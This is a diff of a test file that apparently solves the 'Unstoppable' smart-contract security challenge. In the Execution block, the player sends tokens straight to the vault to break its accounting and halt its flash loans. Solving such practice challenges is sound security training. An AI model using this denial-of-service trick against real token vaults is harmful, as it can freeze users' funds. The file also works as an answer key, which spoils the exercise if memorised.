@@ -23,7 +23,7 @@ describe('[Challenge] Unstoppable', function () {
 
         await token.approve(vault.address, TOKENS_IN_VAULT);
         await vault.deposit(TOKENS_IN_VAULT, deployer.address);
-
+        //TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
         expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
         expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
         expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
@@ -44,7 +44,9 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        //INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;
+        const attackTokenContract = token.connect(player);
+        await attackTokenContract.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
     });
 
     after(async function () {
